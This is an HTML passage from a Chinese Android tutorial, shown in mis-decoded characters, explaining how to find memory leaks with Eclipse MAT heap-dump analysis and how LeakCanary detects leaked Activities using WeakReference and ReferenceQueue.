<li><strong>ä½œç”¨</strong>ï¼šä½¿ç”¨ç±»ä¼¼SQLçš„æŸ¥è¯¢è¯­è¨€æŸ¥è¯¢å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"OQL"è§†å›¾</li>
<li>è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.lang.String <span class="hljs-keyword">WHERE</span> this.value.length <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>
</code></pre>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥æ‰¾ç‰¹å®šæ¡ä»¶çš„å¯¹è±¡</li>
</ul>
<p><strong>MATåˆ†æå†…å­˜æ³„æ¼çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€å †è½¬å‚¨æ–‡ä»¶</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€è½¬æ¢åçš„hprofæ–‡ä»¶</li>
<li>ç­‰å¾…MATåˆ†æå®Œæˆï¼ˆå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæŸ¥çœ‹Leak Suspectsï¼ˆæ¨èå…ˆçœ‹è¿™ä¸ªï¼‰</strong></p>
<ul>
<li>æ‰“å¼€"Leak Suspects"æ ‡ç­¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æŠ¥å‘Šä¼šæ˜¾ç¤ºå¯ç–‘çš„æ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
<li>æ ¹æ®æŠ¥å‘Šå¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šä½¿ç”¨Histogramæ‰¾å‡ºå¤§å¯¹è±¡</strong></p>
<ul>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šä½¿ç”¨Dominator Treeåˆ†æå¯¹è±¡å…³ç³»</strong></p>
<ul>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Path to GC Rootsåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>åœ¨Histogramæˆ–Dominator Treeä¸­ï¼Œå³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šåˆ†ææ³„æ¼åŸå› </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾æ‰¾å‡ºæ³„æ¼åŸå› </li>
<li>å¸¸è§åŸå› ï¼š
<ul>
<li>é™æ€å˜é‡æŒæœ‰</li>
<li>ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
<li>é›†åˆç±»æ³„æ¼</li>
<li>å…¶ä»–åŸå› </li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šå®šä½ä»£ç å¹¶ä¿®å¤</strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é—®é¢˜</li>
<li>ä¿®å¤ä»£ç ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ç­‰ï¼‰</li>
</ul>
<p><strong>MATåˆ†ææŠ€å·§ï¼š</strong></p>
<p><strong>1. å¯¹æ¯”å¤šä¸ªå †è½¬å‚¨</strong></p>
<ul>
<li>ç”Ÿæˆå¤šä¸ªæ—¶é—´ç‚¹çš„å †è½¬å‚¨</li>
<li>å¯¹æ¯”åˆ†æï¼Œæ‰¾å‡ºå†…å­˜å¢é•¿çš„åŸå› </li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡åœ¨å¢é•¿</li>
</ul>
<p><strong>2. ä½¿ç”¨OQLæŸ¥è¯¢</strong></p>
<ul>
<li>ä½¿ç”¨OQLæŸ¥è¯¢ç‰¹å®šå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰Activityå®ä¾‹</li>
<li>åˆ†æè¿™äº›å¯¹è±¡æ˜¯å¦åº”è¯¥å­˜åœ¨</li>
</ul>
<p><strong>3. å…³æ³¨Retained Heap</strong></p>
<ul>
<li>Retained Heapè¡¨ç¤ºå¯¹è±¡åŠå…¶å¼•ç”¨çš„å¯¹è±¡å ç”¨çš„æ€»å†…å­˜</li>
<li>å…³æ³¨Retained Heapå¤§çš„å¯¹è±¡</li>
<li>è¿™äº›å¯¹è±¡å¯èƒ½æ˜¯å†…å­˜æ³„æ¼çš„æ ¹æº</li>
</ul>
<p><strong>4. æ’é™¤å¼±å¼•ç”¨</strong></p>
<ul>
<li>åœ¨Path to GC Rootsæ—¶ï¼Œé€‰æ‹©"exclude weak references"</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶ï¼Œå¯ä»¥æ’é™¤</li>
<li>åªå…³æ³¨å¼ºå¼•ç”¨ï¼Œæ‰¾å‡ºçœŸæ­£çš„æ³„æ¼åŸå› </li>
</ul>
<p><strong>MATå®é™…æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<p><strong>åœºæ™¯ï¼šåˆ†æActivityæ³„æ¼</strong></p>
<p><strong>æ­¥éª¤1ï¼šåœ¨Android Studioä¸­ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>æ‰“å¼€Profiler</li>
<li>é€‰æ‹©åº”ç”¨è¿›ç¨‹</li>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆ</li>
<li>ç‚¹å‡»"Export heap dump"å¯¼å‡ºä¸ºheap.hprof</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰¾åˆ°hprof-convå·¥å…·ï¼ˆåœ¨Android SDKçš„platform-toolsç›®å½•ï¼‰</span>
<span class="hljs-comment"># Windows</span>
C:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\Android\Sdk\platform-tools\hprof-conv.exe heap.hprof heap-converted.hprof

<span class="hljs-comment"># Mac/Linux</span>
~/Library/Android/sdk/platform-tools/hprof-conv heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>æ‰“å¼€MAT</li>
<li>ç‚¹å‡»"File" â†’ "Open Heap Dump"</li>
<li>é€‰æ‹©heap-converted.hprof</li>
<li>ç­‰å¾…åˆ†æå®Œæˆ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥æ‰¾æ³„æ¼çš„Activity</strong></p>
<ul>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥"Activity"</li>
<li>æ‰¾åˆ°MyActivityç±»</li>
<li>æŸ¥çœ‹å®ä¾‹æ•°é‡ï¼ˆæ­£å¸¸åº”è¯¥æ˜¯0æˆ–1ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œå¯èƒ½æœ‰æ³„æ¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>å³é”®ç‚¹å‡»MyActivityå®ä¾‹</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼š
<pre><code class="hljs language-scss" lang="scss">MyActivityå®ä¾‹
  â†‘ (è¢«å¼•ç”¨)
static MyActivity<span class="hljs-selector-class">.activity</span> (é™æ€å˜é‡)
  â†‘ (GC Root)
</code></pre>
</li>
<li>æ‰¾å‡ºæ˜¯é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šå®šä½ä»£ç </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é™æ€å˜é‡</li>
<li>ä¿®å¤ä»£ç ï¼š
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨å¼±å¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> WeakReference&lt;Activity&gt; activityRef;
</code></pre>
</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æå¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li>æ’æŸ¥OOMé—®é¢˜</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-67">5.1.5 LeakCanaryï¼ˆè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> è‡ªåŠ¨æ£€æµ‹åº”ç”¨ä¸­çš„å†…å­˜æ³„æ¼ï¼Œæ— éœ€æ‰‹åŠ¨åˆ†æ</p>
<p><strong>LeakCanaryæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Squareå…¬å¸å¼€å‘çš„å†…å­˜æ³„æ¼æ£€æµ‹åº“</li>
<li>ä¸“é—¨ç”¨äºAndroidåº”ç”¨çš„å†…å­˜æ³„æ¼æ£€æµ‹</li>
<li>åœ¨å¼€å‘é˜¶æ®µè‡ªåŠ¨æ£€æµ‹ï¼Œå‘ç°æ³„æ¼æ—¶æ˜¾ç¤ºé€šçŸ¥</li>
</ul>
<p><strong>æ ¸å¿ƒæ£€æµ‹åŸç†ï¼ˆè¯¦ç»†è¯´æ˜ï¼‰ï¼š</strong></p>
<p>LeakCanaryçš„æ£€æµ‹åŸç†åŸºäº**WeakReferenceï¼ˆå¼±å¼•ç”¨ï¼‰å’ŒReferenceQueueï¼ˆå¼•ç”¨é˜Ÿåˆ—ï¼‰**çš„æœºåˆ¶ã€‚</p>
<p><strong>1. WeakReferenceï¼ˆå¼±å¼•ç”¨ï¼‰çš„å·¥ä½œåŸç†</strong></p>
<p><strong>ä»€ä¹ˆæ˜¯WeakReferenceï¼š</strong></p>
<ul>
<li>WeakReferenceæ˜¯Javaä¸­çš„ä¸€ç§å¼•ç”¨ç±»å‹</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«GCå›æ”¶</li>
<li>å½“å¯¹è±¡åªæœ‰å¼±å¼•ç”¨æ—¶ï¼ŒGCä¼šå›æ”¶è¿™ä¸ªå¯¹è±¡</li>
</ul>
<p><strong>WeakReferenceçš„ç‰¹ç‚¹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå¼±å¼•ç”¨</span>
WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);

<span class="hljs-comment">// è·å–å¯¹è±¡ï¼ˆå¯èƒ½è¿”å›nullï¼Œå¦‚æœå¯¹è±¡å·²è¢«å›æ”¶ï¼‰</span>
<span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> ref.get();

<span class="hljs-comment">// å¦‚æœactivityè¢«GCå›æ”¶ï¼Œref.get()ä¼šè¿”å›null</span>
</code></pre>
<p><strong>2. ReferenceQueueï¼ˆå¼•ç”¨é˜Ÿåˆ—ï¼‰çš„å·¥ä½œåŸç†</strong></p>
<p><strong>ä»€ä¹ˆæ˜¯ReferenceQueueï¼š</strong></p>
<ul>
<li>ReferenceQueueæ˜¯Javaä¸­çš„å¼•ç”¨é˜Ÿåˆ—</li>
<li>å½“WeakReferenceå¼•ç”¨çš„å¯¹è±¡è¢«GCå›æ”¶æ—¶ï¼ŒWeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>é€šè¿‡æ£€æŸ¥ReferenceQueueï¼Œå¯ä»¥çŸ¥é“å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</li>
</ul>
<p><strong>ReferenceQueueçš„å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-number">1.</span> åˆ›å»ºWeakReferenceæ—¶ï¼Œå¯ä»¥æŒ‡å®šReferenceQueue
   WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> WeakReference&lt;&gt;(activity, queue);

<span class="hljs-number">2.</span> å½“activityè¢«GCå›æ”¶æ—¶ï¼Œrefä¼šè¢«è‡ªåŠ¨æ”¾å…¥queue

<span class="hljs-number">3.</span> æ£€æŸ¥queueï¼Œå¦‚æœrefåœ¨queueä¸­ï¼Œè¯´æ˜activityå·²è¢«å›æ”¶
   Reference&lt;?&gt; polled = queue.<span class="hljs-built_in">poll</span>();
   <span class="hljs-keyword">if</span> (polled != null) {
       <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶</span>
   }
</code></pre>
<p><strong>3. LeakCanaryçš„å®Œæ•´æ£€æµ‹æµç¨‹</strong></p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šç›‘æ§å¯¹è±¡ç”Ÿå‘½å‘¨æœŸ</strong></p>
<ul>
<li>LeakCanaryé€šè¿‡Application.ActivityLifecycleCallbacksç›‘æ§Activityçš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>å½“Activityçš„onDestroy()è¢«è°ƒç”¨æ—¶ï¼ŒLeakCanaryå¼€å§‹æ£€æµ‹</li>
</ul>
<p><strong>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºå¼±å¼•ç”¨å’Œå¼•ç”¨é˜Ÿåˆ—</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// LeakCanaryå†…éƒ¨å®ç°ï¼ˆç®€åŒ–ï¼‰</span>
ReferenceQueue&lt;Activity&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceQueue</span>&lt;&gt;();
WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity, queue);
</code></pre>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šç­‰å¾…GC</strong></p>
<ul>
<li>LeakCanaryç­‰å¾…5ç§’ï¼ˆç»™GCæ—¶é—´ï¼‰</li>
<li>ç„¶åè§¦å‘ä¸€æ¬¡GCï¼ˆSystem.gc()ï¼‰</li>
<li>å†ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè®©GCå®Œæˆ</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ£€æŸ¥ReferenceQueue</span>
Reference&lt;?&gt; polled = queue.poll();
<span class="hljs-keyword">if</span> (polled != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶ï¼Œæ²¡æœ‰å†…å­˜æ³„æ¼</span>
} <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// å¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</span>
    <span class="hljs-comment">// éœ€è¦è¿›ä¸€æ­¥ç¡®è®¤</span>
}
</code></pre>
<p><strong>ç¬¬äº”æ­¥ï¼šç¡®è®¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼ŒLeakCanaryä¼šå†æ¬¡è§¦å‘GC</li>
<li>å¦‚æœå¤šæ¬¡GCåå¯¹è±¡ä»ç„¶æ²¡æœ‰è¢«å›æ”¶ï¼Œç¡®è®¤æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ç¬¬å…­æ­¥ï¼šç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ</strong></p>
<ul>
<li>å¦‚æœç¡®è®¤æœ‰å†…å­˜æ³„æ¼ï¼ŒLeakCanaryä¼šç”Ÿæˆå †è½¬å‚¨</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ˜¾ç¤ºæ³„æ¼è·¯å¾„ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>å®Œæ•´æ£€æµ‹æµç¨‹ï¼ˆæ—¶é—´çº¿ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">æ—¶é—´ç‚¹<span class="hljs-number">0</span>ï¼šActivity.<span class="hljs-built_in">onDestroy</span>()è¢«è°ƒç”¨
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">1</span>ï¼šLeakCanaryåˆ›å»ºWeakReferenceæŒ‡å‘Activity
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">2</span>ï¼šç­‰å¾…<span class="hljs-number">5</span>ç§’ï¼ˆç»™GCæ—¶é—´ï¼‰
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">3</span>ï¼šè§¦å‘GCï¼ˆSystem.<span class="hljs-built_in">gc</span>()ï¼‰
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">4</span>ï¼šç­‰å¾…GCå®Œæˆ
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">5</span>ï¼šæ£€æŸ¥ReferenceQueue
         â†“
         â”œâ”€ å¦‚æœrefåœ¨queueä¸­ â†’ Activityå·²è¢«å›æ”¶ â†’ æ²¡æœ‰æ³„æ¼
         â””â”€ å¦‚æœrefä¸åœ¨queueä¸­ â†’ Activityæ²¡æœ‰è¢«å›æ”¶ â†’ å¯èƒ½æœ‰æ³„æ¼
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">6</span>ï¼šå¦‚æœå¯èƒ½æœ‰æ³„æ¼ï¼Œå†æ¬¡è§¦å‘GCç¡®è®¤
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">7</span>ï¼šå¦‚æœç¡®è®¤æ³„æ¼ï¼Œç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">8</span>ï¼šæ˜¾ç¤ºæ³„æ¼é€šçŸ¥å’Œæ³„æ¼è·¯å¾„
</code></pre>
<p><strong>æ ¸å¿ƒä»£ç åŸç†ï¼ˆè¯¦ç»†ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// LeakCanaryçš„æ ¸å¿ƒåŸç†ï¼ˆè¯¦ç»†ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeakCanary</span> {
    <span class="hljs-keyword">private</span> ReferenceQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceQueue</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watch</span><span class="hljs-params">(Object object)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå¼±å¼•ç”¨ï¼ŒæŒ‡å®šå¼•ç”¨é˜Ÿåˆ—</span>
        WeakReference&lt;Object&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(object, queue);
        
        <span class="hljs-comment">// 2. ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç»™GCæ—¶é—´</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">5000</span>);  <span class="hljs-comment">// ç­‰å¾…5ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-comment">// 3. è§¦å‘GC</span>
        System.gc();
        
        <span class="hljs-comment">// 4. å†ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè®©GCå®Œæˆ</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// ç­‰å¾…1ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-comment">// 5. æ£€æŸ¥ReferenceQueue</span>
        Reference&lt;?&gt; polled = queue.poll();
        <span class="hljs-keyword">if</span> (polled != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶ï¼Œæ²¡æœ‰å†…å­˜æ³„æ¼</span>
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 6. å¦‚æœå¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œå†æ¬¡ç¡®è®¤</span>
        <span class="hljs-keyword">if</span> (ref.get() != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œç¡®è®¤æœ‰å†…å­˜æ³„æ¼</span>
            <span class="hljs-comment">// ç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ</span>
            analyzeLeak(object);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyzeLeak</span><span class="hljs-params">(Object object)</span> {
        <span class="hljs-comment">// ç”Ÿæˆå †è½¬å‚¨</span>
        <span class="hljs-type">HeapDump</span> <span class="hljs-variable">heapDump</span> <span class="hljs-operator">=</span> generateHeapDump();
        
        <span class="hljs-comment">// åˆ†æå¼•ç”¨é“¾</span>
        <span class="hljs-type">LeakTrace</span> <span class="hljs-variable">leakTrace</span> <span class="hljs-operator">=</span> findLeakTrace(heapDump, object);
        
        <span class="hljs-comment">// æ˜¾ç¤ºæ³„æ¼é€šçŸ¥</span>
        showLeakNotification(leakTrace);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆWeakReferenceèƒ½æ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>åŸç†è¯´æ˜ï¼š</strong></p>
<ol>
<li>
<p><strong>æ­£å¸¸æƒ…å†µï¼ˆæ²¡æœ‰æ³„æ¼ï¼‰</strong>ï¼š</p>
<ul>
<li>Activity.onDestroy()åï¼ŒActivityåº”è¯¥ä¸å†è¢«å¼•ç”¨</li>
<li>GCæ—¶ï¼ŒActivityä¼šè¢«å›æ”¶</li>
<li>WeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>æ£€æŸ¥ReferenceQueueï¼Œå‘ç°refåœ¨queueä¸­ï¼Œè¯´æ˜Activityå·²è¢«å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>å¼‚å¸¸æƒ…å†µï¼ˆæœ‰æ³„æ¼ï¼‰</strong>ï¼š</p>
<ul>
<li>Activity.onDestroy()åï¼ŒActivityä»ç„¶è¢«æŸä¸ªå¯¹è±¡å¼•ç”¨ï¼ˆæ¯”å¦‚é™æ€å˜é‡ï¼‰</li>
<li>GCæ—¶ï¼ŒActivityå› ä¸ºæœ‰å¼ºå¼•ç”¨ï¼Œä¸ä¼šè¢«å›æ”¶</li>
<li>WeakReferenceä¸ä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>æ£€æŸ¥ReferenceQueueï¼Œå‘ç°refä¸åœ¨queueä¸­ï¼Œè¯´æ˜Activityæ²¡æœ‰è¢«å›æ”¶</li>
<li>ç¡®è®¤æœ‰å†…å­˜æ³„æ¼</li>
</ul>
</li>
</ol>
<p><strong>å¼•ç”¨é“¾åˆ†æåŸç†ï¼š</strong></p>
<p>å½“LeakCanaryç¡®è®¤æœ‰å†…å­˜æ³„æ¼åï¼Œä¼šï¼š</p>
<ol>
<li><strong>ç”Ÿæˆå †è½¬å‚¨</strong>ï¼šä¿å­˜å½“å‰æ‰€æœ‰å¯¹è±¡çš„å†…å­˜å¿«ç…§</li>
<li><strong>åˆ†æå¼•ç”¨é“¾</strong>ï¼šä»æ³„æ¼å¯¹è±¡å¼€å§‹ï¼Œå‘ä¸ŠæŸ¥æ‰¾å¼•ç”¨é“¾</li>
<li><strong>æ‰¾å‡ºæ³„æ¼è·¯å¾„</strong>ï¼šæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activity</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activity = <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// LeakCanaryåˆ†æçš„å¼•ç”¨é“¾ï¼š</span>
<span class="hljs-comment">// MyActivityå®ä¾‹</span>
<span class="hljs-comment">//   â†‘ (è¢«å¼•ç”¨)</span>
<span class="hljs-comment">// static MyActivity.activity (é™æ€å˜é‡)</span>
<span class="hljs-comment">//   â†‘ (GC Root)</span>
<span class="hljs-comment">// </span>
<span class="hljs-comment">// æ³„æ¼è·¯å¾„ï¼šstatic MyActivity.activity -&gt; MyActivityå®ä¾‹</span>
</code></pre>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>1. æ·»åŠ ä¾èµ–</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
}
</code></pre>
<p><strong>2. è¿è¡Œåº”ç”¨</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨é›†æˆåˆ°åº”ç”¨ä¸­</li>
<li>ä¸éœ€è¦é¢å¤–é…ç½®</li>
<li>ä¼šè‡ªåŠ¨ç›‘æ§Activityå’ŒFragment</li>
</ul>
<p><strong>3. è‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å‘ç°æ³„æ¼æ—¶ä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>ç‚¹å‡»é€šçŸ¥å¯ä»¥æŸ¥çœ‹æ³„æ¼è·¯å¾„</li>
</ul>
<p><strong>4. æŸ¥çœ‹æ³„æ¼æŠ¥å‘Š</strong></p>
<ul>
<li>LeakCanaryä¼šæ˜¾ç¤ºæ³„æ¼è·¯å¾„</li>
<li>å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è‡ªåŠ¨æ£€æµ‹</strong>ï¼šä¸éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
